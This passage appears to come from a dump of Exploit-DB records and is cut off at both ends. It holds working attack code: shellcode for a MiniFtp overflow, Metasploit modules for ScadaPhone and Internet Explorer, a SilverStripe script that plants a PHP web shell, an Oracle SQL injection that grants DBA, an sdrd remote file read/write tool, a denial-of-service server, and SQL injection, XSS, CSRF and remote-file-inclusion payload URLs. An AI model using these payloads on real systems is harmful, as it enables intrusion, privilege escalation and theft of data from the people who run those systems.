0x9090909090909090  R10: 0x83a  R11: 0x7ffff7891520 (<__strcmp_sse2_unaligned>:	mov    eax,edi) R12: 0x555555556860 (<_start>:	xor    ebp,ebp) R13: 0x7fffffffe200 --> 0x1  R14: 0x0  R15: 0x0 EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------]    0x7fffffffd478:	imul   esi,DWORD PTR [rax+0x3d],0x90909090    0x7fffffffd47f:	nop    0x7fffffffd480:	nop => 0x7fffffffd481:	nop    0x7fffffffd482:	nop    0x7fffffffd483:	nop    0x7fffffffd484:	nop    0x7fffffffd485:	nop [------------------------------------stack-------------------------------------] 0000| 0x7fffffffd460 --> 0x555555556860 (<_start>:	xor    ebp,ebp) 0008| 0x7fffffffd468 --> 0x55555555b5b2 (""miniftpd.conf"") 0016| 0x7fffffffd470 (""max_per_ip="", '\220' <repeats 189 times>...) 0024| 0x7fffffffd478 --> 0x90909090903d7069  0032| 0x7fffffffd480 --> 0x9090909090909090  0040| 0x7fffffffd488 --> 0x9090909090909090  0048| 0x7fffffffd490 --> 0x9090909090909090  0056| 0x7fffffffd498 --> 0x9090909090909090  [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x00007fffffffd481 in ?? () gdb-peda$     -----------------------------[Exploit]---------------------------------------------  python -c ""print 'max_per_ip=' + '\x90' * 278 + '\x48\x31\xc0\x48\x31\xd2\x50\x49\xb9\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x41\x51\x48\x89\xe7\x50\x52\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05' + '\x80\xd4\xff\xff\xff\x7f'"" > miniftpd.conf    -----------------------------[how to run]-----------------------------  run the line above in a shell  run MiniFtp in gdb and you got a shell",MiniFtp,1
17833,"ScadaTEC ScadaPhone 5.3.11.1230 - Local Stack Buffer Overflow (Metasploit) ## # $Id: scadaphone_zip.rb 13728 2011-09-13 20:10:28Z swtornio $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core' require 'rex/zip'  class Metasploit3 < Msf::Exploit::Remote 	Rank = GoodRanking  	include Msf::Exploit::FILEFORMAT 	include Msf::Exploit::Remote::Seh 	include Msf::Exploit::Remote::Egghunter  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'ScadaTEC ScadaPhone <= v5.3.11.1230 Stack Buffer Overflow', 			'Description'    => %q{ 					This module exploits a stack-based buffer overflow vulnerability in 				version 5.3.11.1230 of scadaTEC's ScadaPhone.  				In order for the command to be executed, an attacker must convince someone to 				load a specially crafted project zip file with ScadaPhone. 				By doing so, an attacker can execute arbitrary code as the victim user. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'mr_me <steventhomasseeley[at]gmail.com>', # found + msf 				], 			'Version'        => '$Revision: 13728 $', 			'References'     => 				[ 					#[ 'CVE', '' ], 					[ 'OSVDB', '75375' ], 					[ 'URL', 'http://www.scadatec.com/' ], 					[ 'URL', 'http://www.exploit-db.com/exploits/17817/' ], 				],          		'Platform'          => [ 'win' ],          		'Payload'           => 				{ 					'Space'    => 700, 					'BadChars' => ""\x00\x0a\x0d"", 					'DisableNops' => true, 				}, 			'Targets'        => 				[ 					# POP ESI; POP EBX; RETN [ScadaPhone.exe] 					[ 'Windows Universal', { 'Ret' => 0x004014F4 } ], 				], 			'DisclosureDate' => 'Sep 12 2011', 			'DefaultTarget'  => 0))  			register_options( 		 	[ 				OptString.new('FILENAME', [ true, 'The output file name.', 'msf.zip']), 			], self.class)  	end  	def exploit  		eggoptions =  		{ 			:checksum => false, 			:eggtag => 'zipz'  		}  		hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)  		fname = rand_text_alpha_upper(229) 		fname << hunter 		fname << rand_text_alpha_upper(48-hunter.length) 		fname << Rex::Arch::X86.jmp_short(-50) 		fname << rand_text_alpha_upper(2) 		fname << [target.ret].pack('V') 		fname << rand_text_alpha_upper(100) 		fname << egg 		fname << rand_text_alpha_upper(4096-fname.length) 		fname << [0x7478741e].pack('V')  		zip = Rex::Zip::Archive.new 		xtra = [0xdac0ffee].pack('V') 		comment = [0xbadc0ded].pack('V') 		zip.add_file(fname, xtra, comment)  		# Create the file 		print_status(""Creating '#{datastore['FILENAME']}' file..."")  		file_create(zip.pack) 	end  end",.scadatec.,1
16547,"Microsoft Internet Explorer - Style getElementsByTagName Memory Corruption (MS09-072) (Metasploit) ## # $Id: ms09_072_style_object.rb 9787 2010-07-12 02:51:50Z egypt $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::HttpServer::HTML 	# 	# Superceded by ms10_018_ie_behaviors, disable for BrowserAutopwn 	# 	#include Msf::Exploit::Remote::BrowserAutopwn 	#autopwn_info({ 	#	:ua_name    => HttpClients::IE, 	#	:ua_minver  => ""6.0"", 	#	:ua_maxver  => ""7.0"", 	#	:javascript => true, 	#	:os_name    => OperatingSystems::WINDOWS, 	#	:vuln_test  => nil, # no way to test without just trying it 	#	:rank       => LowRanking  # exploitable on ie7/vista 	#})  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Internet Explorer Style getElementsByTagName Memory Corruption', 			'Description'    => %q{ 				This module exploits a vulnerability in the getElementsByTagName function 			as implemented within Internet Explorer. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'securitylab.ir <K4mr4n_st[at]yahoo.com>', 					'jduck' 				], 			'Version'        => '$Revision: 9787 $', 			'References'     => 				[ 					['MSB', 'MS09-072'], 					['CVE', '2009-3672'], 					['OSVDB', '50622'], 					['BID', '37085'], 					['URL', 'http://www.microsoft.com/technet/security/advisory/977981.mspx'], 					['URL', 'http://taossa.com/archive/bh08sotirovdowd.pdf'], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC'          => 'process', 					'HTTP::compression' => 'gzip', 					'HTTP::chunked'     => true 				}, 			'Payload'        => 				{ 					'Space'    => 1000, 					'BadChars' => ""\x00"", 					'Compat'   => 						{ 							'ConnectionType' => '-find', 						}, 					'StackAdjustment' => -3500 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'Automatic', { }], 				], 			'DisclosureDate' => 'Nov 20 2009', 			'DefaultTarget'  => 0)) 	end  	def on_request_uri(cli, request)  		# resulting eips: 		# 0x501d6bd8 # windows vista ie7 (mshtml.dll 7.0.6001.18203) 		# 0xc5fe7dc9 # windows xp sp3 ie6 (mshtml.dll 6.0.2900.5848) 		# nul deref! # windows xp sp3 ie7 (mshtml.dll 7.0.5730.13) 		# 0x6e767fae # windows 2k3 sp2 ie6 (mshtml.dll 6.0.3790.4470) 		# 0x6cf941a7 # windows 2k3 sp2 ie7 (mshtml.dll 7.0.6000.16825)  		print_status(""Entering heap spray mode for #{cli.peerhost}:#{cli.peerport}"")  		var_memory    = rand_text_alpha(rand(100) + 1) 		var_boom      = rand_text_alpha(rand(100) + 1) 		var_body      = rand_text_alpha(rand(100) + 1) 		var_unescape  = rand_text_alpha(rand(100) + 1) 		var_shellcode = rand_text_alpha(rand(100) + 1) 		var_spray     = rand_text_alpha(rand(100) + 1) 		var_start     = rand_text_alpha(rand(100) + 1) 		var_i         = rand_text_alpha(rand(100) + 1) 		var_ss        = rand_text_alpha(rand(100) + 1) 		var_fb        = rand_text_alpha(rand(100) + 1) 		var_bk        = rand_text_alpha(rand(100) + 1)  		html = %Q|<!DOCTYPE> <head> <script language=javascript> function #{var_boom}(){ document.getElementsByTagName('STYLE')[0].outerHTML++; } function #{var_body}(){ var #{var_unescape} = unescape; var #{var_shellcode} = #{var_unescape}( '#{Rex::Text.to_unescape(regenerate_payload(cli).encoded)}'); var #{var_spray} = #{var_unescape}( ""%"" + ""u"" + ""0"" + ""c"" + ""0"" + ""c"" + ""%u"" + ""0"" + ""c"" + ""0"" + ""c"" ); var #{var_ss} = 20 + #{var_shellcode}.length; while (#{var_spray}.length < #{var_ss}) #{var_spray}+=#{var_spray}; #{var_fb} = #{var_spray}.substring(0,#{var_ss}); #{var_bk} = #{var_spray}.substring(0,#{var_spray}.length-#{var_ss}); while(#{var_bk}.length+#{var_ss} < 0x100000) #{var_bk} = #{var_bk}+#{var_bk}+#{var_fb}; var #{var_memory} = new Array(); for (#{var_i}=0;#{var_i}<1285;#{var_i}++) #{var_memory}[#{var_i}]=#{var_bk}+#{var_shellcode}; #{var_boom}(); } </script> <STYLE>* { margin: 0; overflow: scroll }</STYLE> <BODY ONLOAD=""#{var_body}()""> </body> </html> |  		# Transmit the response to the client 		send_response(cli, html, { 'Content-Type' => 'text/html', 'Pragma' => 'no-cache' })  		# Handle the payload 		handler(cli) 	end end",.microsoft.,1
37116,"SilverStripe CMS 2.4.7 - 'install.php' PHP Code Injection # source: https://www.securityfocus.com/bid/53282/info #  # SilverStripe is prone to a remote PHP code-injection vulnerability. #  # An attacker can exploit this issue to inject and execute arbitrary PHP code in the context of the affected application. This may facilitate a compromise of the application and the underlying system; other attacks are also possible. #  # SilverStripe 2.4.7 is vulnerable; other versions may also be affected.  #   #!/usr/bin/env python # -*- coding:utf-8 -*- import httplib, urllib, urllib2,sys, getopt   def Menu():     print ""\n\n-------------------------------------------------------""     print ""-Kullanim Klavuzu [ USAGE ]               ""     print ""-------------------------------------------------------""     print ""- Temel Kullanim - I [ Default Usage ] :                  ""     print ""-        python exo.py www.target.com /            \n""     print ""- Temel Kullanim - II [ Default Usage ] :                 ""     print ""-        python exo.py www.target.com /path/          \n"" if (len(sys.argv) <= 2) or (len(sys.argv) > 3):     Menu()     exit(1) host = sys.argv[1] path = sys.argv[2]   print "" [+] Exploit ediliyor..!"" payload=""blackcandy');fwrite(fopen("" payload+='""../shellcik.php"",""w""), ' payload+=""'<?php $gelen"" payload+='=@$_GET[""gelen""]; echo shell_exec($gelen);?>' parametreler = urllib.urlencode({'db[type]':'MySQLDatabase', 'db[MySQLDatabase][server]':'localhost', 'db[MySQLDatabase][username]':'root', 'db[MySQLDatabase][password]':'qwe123', 'db[MySQLDatabase][database]':'SS_mysite', 'db[MSSQLDatabase][server]':'localhost', 'db[MSSQLDatabase][username]':'root', 'db[MSSQLDatabase][password]':'qwe123', 'db[MSSQLDatabase][database]':'SS_mysite', 'db[PostgreSQLDatabase][server]':'localhost', 'db[PostgreSQLDatabase][username]':'root', 'db[PostgreSQLDatabase][password]':'qwe123', 'db[PostgreSQLDatabase][database]':'SS_mysite', 'db[SQLiteDatabase][path]':'/var/www/SilverStripe/assets/.db', 'db[SQLiteDatabase][database]':'SS_mysite', 'admin[username]':'admin', 'admin[password]':'qwe123', 'locale':'en_US', 'template':payload, 'stats':'on', 'go':'Installing SilverStripe...'}) print "" [+]Parametreler olusturuldu [ Params Generated For Http Request ]"" basliklar = {""Content-type"": ""application/x-www-form-urlencoded"",              ""Accept"": ""text/plain"",              ""User-Agent"":""Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:11.0) Gecko/20100101 Firefox/11.0"",              ""Accept"":""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"",              ""Accept-Language"":""en-us,en;q=0.5"",              ""Accept-Encoding"":""gzip, deflate"",              ""Connection"":""keep-alive"",              ""Referer"":""http://"" + host + path+""install.php"",              ""Cookie"":""alc_enc=1%3Aa9dbf14198a8f6bd9dd2d2c3e41e7164fb206d76; PastMember=1; PHPSESSID=0d7k4e661jd96i0u64vij68am3; phpbb3_srzvs_k=; phpbb3_srzvs_u=2; phpbb3_srzvs_sid=ede0a17fc1f375d6a633f291119c92d7; style_cookie=null; PHPSESSID=j7nr6uro3jc5tulodfeoum3u90; fws_cust=mince%232%23d41d8cd98f00b204e9800998ecf8427e"" } print "" [+]Basliklar olusturuldu [ Headers Generated For Http Request ]"" conn = httplib.HTTPConnection(""localhost:80"") conn.request(""POST"",str(path) +""install.php"",parametreler,basliklar) responce = conn.getresponse() if responce.status != 200:     print ""[+]Http Hatasi : "" + responce.status + ""\n""     print ""Cant Exploit!:("" if responce.status == 200:     komut=""""     while( komut != ""exit"" ):         komut = urllib.quote_plus(str(raw_input(""Shell :) => "")))         print urllib2.urlopen(""http://"" + host + path+""shellcik.php?gelen=""+komut).read()",.target.,0
17678,"WordPress Plugin Contus HD FLV Player 1.3 - SQL Injection # Exploit Title: WordPress Contus HD FLV Player plugin <= 1.3 SQL Injection Vulnerability # Date: 2011-08-17 # Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm) # Software Link: http://downloads.wordpress.org/plugin/contus-hd-flv-player.1.3.zip # Version: 1.3 (tested)  --- PoC --- http://www.site.com/wp-content/plugins/contus-hd-flv-player/process-sortable.php?playid=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)&listItem[]=1  --------------- Vulnerable code --------------- $pid1 = $_GET['playid'];  foreach ($_GET['listItem'] as $position => $item) :     mysql_query(""UPDATE $wpdb->prefix"" . ""hdflv_med2play SET `sorder` = $position WHERE `media_id` = $item and playlist_id=$pid1 ""); endforeach;",.site.,0
19516,"Microsoft MSN Messenger Service 1.0 Setup BBS - ActiveX Control Buffer Overflow source: https://www.securityfocus.com/bid/668/info  There is a buffer overflow in the 4.71.0.10 version of the MSN Setup BBS ActiveX control (setupbbs.ocx).. This ActiveX control is marked 'Safe for Scripting' . Arbitrary commands may be executed if the ActiveX control is run in a malicious manner.   SETUPBBS:  When this control is initialised, it will display a prompt  notifying the user that the control is capable of modifying  Mail and News configuration etc and asks the user whether  he/she wishes the control to proceed. This control is  exploitable through two different methods, vAddNewsServer  and bIsNewsServerConfigured. I have simply RET'd to  ExitProcess with this exploit, although there are other  possibilities.  <object    classid=""clsid:8F0F5093-0A70-11D0-BCA9-00C04FD85AA6""  id=""setupbbs""></OBJECT>  <script language=""vbscript""><!--  msgbox(""MSN Setup BBS Buffer Overrun"" + Chr(10) + ""Written  by Shane Hird"")  expstr=""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA""  'RET address (ExitProcess BFF8D4CA) expstr = expstr + Chr(202) + Chr(212) + Chr(248) + Chr(191)  'This buffer overrun can be triggered by either method. 'setupbbs.vAddNewsServer expstr, true setupbbs.bIsNewsServerConfigured expstr  --></script>",Microsoft,1
41474,"BlueIris 4.5.1.4 - Denial of Service import socket   # Title: BlueIris - Denial of Service # Date: 2017-02-28 # Exploit Author: Peter Baris # Vendor Homepage: http://www.saptech-erp.com.au # Software Link: http://blueirissoftware.com/blueiris.exe # Version: 4.5.1.4 # Tested on: Windows Server 2008 R2 Standard x64   # Start this fake FTP server and create an FTP connection in the software. Use the ""Test"" button to trigger the vulnerability.  buffer = ""A""*5000 port = 21 s = socket.socket() ip = '0.0.0.0'              s.bind((ip, port))             s.listen(5)                        print 'Listening on FTP port: '+str(port)   while True: 	conn, addr = s.accept()      	conn.send('220 '+buffer+'\r\n') 	conn.recv(1024) 	conn.send('250 '+buffer+'\r\n') 	conn.close()",.saptech-erp.,0
14446,"PhotoPost - PHP SQL Injection # Exploit Title: PhotoPost PHP SQL Injection Vulnerability # Date: 23/07/2010 # Author: Cyber-sec # Software Link: www.photopost.com # Version: 4.0 - 4.6 # Tested on: windows xp pack 3 # CVE : N/A  						 --------------------------exploit------------------------------ dork : Powered by: PhotoPost PHP 4.6  exploit: www.site.com/photopost/index.php?cat=1 [sql injection] --------------------------------------------------------------------------------------- Special Thanks to : Dz-Ghost theblind747 all my frend",.photopost.,1
12631,"Tainos Webdesign (All Scripts) - SQL Injection / Cross-Site Scripting / HTML Injection -------------------------------------------------------------------------------------------  Tainos Webdesign (All Scripts) SQL/XSS/HTML Injection Vulnerability  -------------------------------------------------------------------------------------------  Author: CoBRa_21  Mail: uyku_cu@windowslive.com  Script Home: http://www.tainos-webdesign.com  Dork: intext:""© Tainos Webdesign""  -------------------------------------------------------------------------------------------  Sql Injection:  http://localhost/[path]/propertylux.php?ID=1 (SQL) http://localhost/[path]/property.php?ID=199 (SQL)  -------------------------------------------------------------------------------------------  XSS Injection:  http://localhost/[path]/class.php?Class=Rental&Subclass= http://localhost/[path]/class.php?Class=Sales&Subclass= http://localhost/[path]/classlux.php?Class=Luxury&Subclass= -------------------------------------------------------------------------------------------  HTML Injection:  http://localhost/[path]/class.php?Class=Rental&Subclass=<font color=red size=15>CoBRa_21</font> http://localhost/[path]/class.php?Class=Sales&Subclass=<font color=red size=15>CoBRa_21</font> http://localhost/[path]/classlux.php?Class=Luxury&Subclass=<font color=red size=15>CoBRa_21</font> -------------------------------------------------------------------------------------------",.tainos-webdesign.,1
24677,"IBM DB2 DTS To String Conversion - Denial of Service source: https://www.securityfocus.com/bid/11400/info  IBM DB2 is reported prone to a denial of service vulnerability when DTS to string conversion is carried out.  It is reported that during a DTS to string conversion a trap occurs if an empty formatting string is provided. The vulnerability is exposed in the 'to_char' and 'to_date' conversion functions.   select to_char('aaa','') from sysibm.sysdummy1 select to_date('aaa', '') from sysibm.sysdummy1",IBM,1
3584,"Oracle 10g KUPM$MCP.MAIN - SQL Injection (2) #!/usr/bin/perl # # Remote Oracle KUPM$MCP.MAIN exploit (10g) #  - Version 2 - New ""evil cursor injection"" tip! #  - No ""create procedure"" privilege needed! #  - See: http://www.databasesecurity.com/ (Cursor Injection) # # Grant or revoke dba permission to unprivileged user #  # Tested on ""Oracle Database 10g Enterprise Edition Release 10.1.0.3.0"" #  #   REF:    http://www.red-database-security.com/ #    #   AUTHOR: Andrea ""bunker"" Purificato #           http://rawlab.mindcreations.com # #   DATE:   Copyright 2007 - Tue Mar 27 10:46:55 CEST 2007 # # Oracle InstantClient (basic + sdk) required for DBD::Oracle #  #  # bunker@fin:~$ perl kupm-mcpmainV2.pl -h localhost -s test -u bunker -p **** -r #  [-] Wait... #  [-] Revoking DBA from BUNKER... #  DBD::Oracle::db do failed: ORA-01951: ROLE 'DBA' not granted to 'BUNKER' (DBD ERROR: OCIStmtExecute) [for Statement ""REVOKE DBA FROM BUNKER""] at kupm-mcpmainV2.pl line 104. #  [-] Done! #  # bunker@fin:~$ perl kupm-mcpmainV2.pl -h localhost -s test -u bunker -p **** -g #  [-] Wait... #  [-] Creating evil cursor... #  Cursor: 2 #  [-] Go ...(don't worry about errors)! #  DBD::Oracle::st execute failed: ORA-06512: at ""SYS.KUPM$MCP"", line 874 #  ORA-06512: at line 3 (DBD ERROR: OCIStmtExecute) [for Statement "" #  BEGIN #    SYS.KUPM$MCP.MAIN(''' AND 0=dbms_sql.execute(2)--',''); #  END; #  ""] at kupm-mcpmainV2.pl line 134. #  [-] YOU GOT THE POWAH!! #  # bunker@fin:~$ perl kupm-mcpmainV2.pl -h localhost -s test -u bunker -p **** -r #  [-] Wait... #  [-] Revoking DBA from BUNKER... #  [-] Done! #  use warnings; use strict; use DBI; use Getopt::Std; use vars qw/ %opt /;  sub usage {     print <<""USAGE"";      Syntax: $0 -h <host> -s <sid> -u <user> -p <passwd> -g|-r [-P <port>]  Options:      -h     <host>     target server address      -s     <sid>      target sid name      -u     <user>     user      -p     <passwd>   password        -g|-r             (g)rant dba to user | (r)evoke dba from user     [-P     <port>     Oracle port]  USAGE     exit 0 }  my $opt_string = 'h:s:u:p:grP:'; getopts($opt_string, \%opt) or &usage; &usage if ( !$opt{h} or !$opt{s} or !$opt{u} or !$opt{p} ); &usage if ( !$opt{g} and !$opt{r} ); my $user = uc $opt{u};  my $dbh = undef; if ($opt{P}) {     $dbh = DBI->connect(""dbi:Oracle:host=$opt{h};sid=$opt{s};port=$opt{P}"", $opt{u}, $opt{p}) or die; } else {     $dbh = DBI->connect(""dbi:Oracle:host=$opt{h};sid=$opt{s}"", $opt{u}, $opt{p}) or die; }  my $sqlcmd = ""GRANT ALL PRIVILEGE, DBA TO $user""; print ""[-] Wait...\n""; $dbh->func( 1000000, 'dbms_output_enable' );   if ($opt{r}) {     print ""[-] Revoking DBA from $user...\n"";     $sqlcmd = ""REVOKE DBA FROM $user"";     $dbh->do( $sqlcmd );     print ""[-] Done!\n"";     $dbh->disconnect;     exit; }  print ""[-] Creating evil cursor...\n""; my $sth = $dbh->prepare(qq{ DECLARE MYC NUMBER; BEGIN   MYC := DBMS_SQL.OPEN_CURSOR;   DBMS_SQL.PARSE(MYC,'declare pragma autonomous_transaction; begin execute immediate ''$sqlcmd'';commit;end;',0);   DBMS_OUTPUT.PUT_LINE('Cursor: '||MYC); END; } ); $sth->execute; my $cursor = undef; while (my $line = $dbh->func( 'dbms_output_get' )) {      print ""$line\n"";     if ($line =~ /^Cursor: (\d)/) {$cursor = $1;} } $sth->finish;  print ""[-] Go ...(don't worry about errors)!\n""; $sth = $dbh->prepare(qq{ BEGIN   SYS.KUPM\$MCP.MAIN(''' AND 0=dbms_sql.execute($cursor)--',''); END; }); $sth->execute; $sth->finish; print ""[-] YOU GOT THE POWAH!!\n""; $dbh->disconnect; exit;  # milw0rm.com [2007-03-27]",.databasesecurity.,0
19297,"IBM Scalable POWERparallel (SP) 2.0 - 'sdrd' File Read /* source: https://www.securityfocus.com/bid/371/info  There is a vulnerability in the System Data Repository (SDR) subsystem. The SDR subsystem is used in IBM SP multi-machine parallel processing environments typically associated with Super Computing. The SDR is deisgned to allow multiple machines to share configuration and operational information. However, proper authentication is not in place in the SDR daemon 'sdrd', this allows un-authenticated users to arbitrarily pull any file off SDR hosts.  */  /*## copyright LAST STAGE OF DELIRIUM oct 1998 poland        *://lsd-pl.net/ #*/ /*## sdrd                                                                    #*/  /*   remotely get/put and replace files on the IBM SP2 Control Workstation    */ /*   the get (-g) option works from any host, while the put/replace (-p/-r)   */ /*   options work only from within one of the SP2 nodes                       */ /*   the ifile denotes the source file for a given operation, ofile stands    */ /*   for the target filename                                                  */  #include <sys/types.h> #include <sys/socket.h> #include <sys/time.h> #include <netinet/in.h> #include <netdb.h> #include <unistd.h> #include <stdio.h> #include <fcntl.h> #include <errno.h>  int getresponse(int sck,int *arg){     char c,buffer[64],*b;      int i,res,*tab[2];      tab[0]=&res;tab[1]=arg;     for(i=0;i<2;i++){         b=buffer;         while(1){             if(read(sck,&c,1)<0) {perror(""error"");exit(-1);}             if(c==' ') break;             *b++=c;         }         *b++=0;         *tab[i]=atoi(buffer);     }     return(res); }  main(int argc,char **argv){     char buffer[10000],tmp[1024],*ifile,*ofile,*b,*p;     int sck,i,c,arg,flag=-1,fd;     struct sockaddr_in adr;     struct hostent *hp;     FILE *f; struct stat sbuf;      printf(""copyright LAST STAGE OF DELIRIUM oct 1998 poland  //lsd-pl.net/\n"");     printf(""sdrd for aix 4.1 4.2 PowerPC/POWER\n\n"");      if(argc!=5){         printf(""usage: %s address -g|-p|-r ifile ofile\n"",argv[0]);         exit(-1);     }      while((c=getopt(argc-1,&argv[1],""gpr""))!=-1){         switch(c){         case 'g': flag=1; break;         case 'p': flag=2; break;         case 'r': flag=3; break;         default : exit(-1);         }     }     if(flag==-1) exit(-1);      ifile=argv[optind+1];     ofile=argv[optind+2];      sck=socket(AF_INET,SOCK_STREAM,0);     adr.sin_family=AF_INET;     adr.sin_port=htons(5712);     if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){         if((hp=gethostbyname(argv[1]))==NULL){             errno=EADDRNOTAVAIL;perror(""error"");exit(-1);         }         memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);     }      if(connect(sck,(struct sockaddr*)&adr,sizeof(struct sockaddr_in))<0){         perror(""error"");exit(-1);     }      switch(flag){     case 1:         printf(""getting %s from %s\n"",ifile,argv[1]);         sprintf(tmp,""SDRFiles/../../../../../../../../../../../../..%s"",ifile);         sprintf(buffer,""3 %d %s"",strlen(tmp),tmp);         write(sck,buffer,strlen(buffer));         if(getresponse(sck,&arg)){             printf(""error: no file %s:%s\n"",argv[1],ifile);exit(-1);         }         if((fd=open(ofile,O_RDWR|O_CREAT,0600))<0){             printf(""error: create %s\n"",ofile);exit(-1);         }         while(arg){             if((i=read(sck,buffer,arg))<0) {perror(""error"");exit(-1);}                write(fd,buffer,i);             arg-=i;         }          break;     case 2:         printf(""putting %s to %s:%s\n"",ifile,argv[1],ofile);         goto common;     case 3:         printf(""replace %s:%s with %s\n"",argv[1],ofile,ifile);         goto common;  common:         gethostname(tmp,sizeof(tmp));         sprintf(buffer,""8 18 0 %s:%d:1"",tmp,getpid());         write(sck,buffer,strlen(buffer));         if(getresponse(sck,&arg)){              printf(""error: auth\n"");exit(-1);         }         if((fd=open(ifile,O_RDONLY))<0){             printf(""error: open %s\n"",ifile);exit(-1);         }         fstat(fd,&sbuf);         sprintf(tmp,""SDRFiles/../../../../../../../../../..%s"",ofile);         if(!(b=(char*)malloc(strlen(tmp)+sbuf.st_size+32))){             printf(""error: memory alloc"");exit(-1);         }         if(flag==3) sprintf(b,""2 %d %s "",strlen(tmp)+sbuf.st_size,tmp);         else sprintf(b,""19 %d %s "",strlen(tmp)+sbuf.st_size,tmp);         p=b+strlen(b);         arg=sbuf.st_size;         while(arg){             if((i=read(fd,p,arg))<0) {perror(""error"");exit(-1);}             arg-=i;p+=i;         }         close(fd);         *p=0;         write(sck,b,strlen(b));         if(flag==3) while(arg){             if((i=read(sck,buffer,arg))<0) {perror(""error"");exit(-1);}             arg-=i;         }         if(getresponse(sck,&arg)){              printf(""error: create %s:%s\n"",argv[1],ofile);exit(-1);         }     }     printf(""ok!\n"");     close(fd); }",IBM,1
31011,Members Area System 1.7 - 'view_func.php' Remote File Inclusion source: https://www.securityfocus.com/bid/27244/info  Members Area System is prone to a remote file-include vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit this issue to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may facilitate a compromise of the application and the underlying system; other attacks are also possible.  This issue affects Members Area System 1.7; other versions are also likely affected.   http://www.example.com/view_func.php?i=http://www.example2.com/justsomedir/&l=testfile.txt?,Members,1
42133,"Robert 0.5 - Multiple Vulnerabilities # Exploit Title: Robert 0.5 - Multiple Vulnerabilities XSS, CSRF, Directory traversal & SQLi # Date: 07/06/2017 # Exploit Author: Cyril Vallicari / HTTPCS - ZIWIT # Vendor website :http://robert.polosson.com/ # Download link : https://github.com/RobertManager/robert/archive/master.zip # Live demo : http://robertdemo.polosson.com/ # Version: 0.5 # Tested on: Windows 7 x64 SP1 / Kali Linux   Web-application open-source management of equipment park for rental or loan. Written in HTML, PHP, MySQL, CSS and Javascript.  Description : Multiple security issues have been found :  XSS, CSRF, Directory Traversal, SQLi   1- XSS reflected  http://192.168.3.215/robert/index.php?go=infos%22%3E%3Cscript%3Ealert(1)%3C/script%3E param vuln : go script vuln : index.php  2- XSS reflected  POST /robert/modals/personnel_list_techniciens.php data : searchingfor=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E&searchingwhat=surnom param vuln : searchingfor script vuln : personnel_list_techniciens.php  3- XSS Stored  POST /robert/fct/matos_actions.php data:  action=addMatos&label=%22%3E%3Cscript%3Ealert(2)%3C%2Fscript%3E&ref=""><script>alert(1)</script>&categorie=son&sousCateg=0&Qtotale=1&dateAchat=&tarifLoc=1&valRemp=1&externe=0&ownerExt=&remarque=%22%3E%3Cscript%3Ealert(3)%3C%2Fscript%3E param vuln : label, ref et remarque script vuln : matos_actions.php  4- XSS Stored  POST /robert/fct/packs_actions.php data :action=addPack&label=%22%3E%3Cscript%3Ealert(5)%3C%2Fscript%3E&ref=""><script>alert(4)</script>&categorie=son&detail=undefined&externe=0&remarque=%22%3E%3Cscript%3Ealert(6)%3C%2Fscript%3E&detail={""2"":1} param vuln : label, ref et remarque script vuln : packs_actions.php  5- XSS stored  POST /robert/fct/beneficiaires_actions.php action=modif&id=2&surnom=""><script>alert(7)</script>&GUSO=&CS=&prenom=""><script>alert(8)</script>&nom=""><script>alert(9)</script>&email=&tel=&birthDay=0000-00-00&birthPlace=&habilitations=undefined&categorie=regisseur&SECU=&SIRET=N/A&intermittent=0&adresse=&cp=&ville=&assedic= param vuln : surnom, prenom, nom script vuln : beneficiaires_actions.php  6- XSS stored  POST /robert/fct/tekos_actions.php action=addStruct&id=1&label=test%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E&NomRS=&type=""><script>alert(3)</script>&adresse=test""><script>alert(4)</script>&codePostal=12312&ville=""><script>alert(5)</script>&email=""><script>alert(6)</script>&tel=&SIRET=""><script>alert(8)</script>&remarque=%22%3E%3Cscript%3Ealert(9)%3C%2Fscript%3E param vuln : label, type, adresse, ville, email, SIRET et remarque script vuln : beneficiaires_actions.php  7- CSRF Create new admin  <form action=""http://192.168.3.215/robert/fct/user_actions.php"" method=""POST""> <input type=""hidden"" name=""action"" value=""create""/> <input type=""hidden"" name=""cMail"" 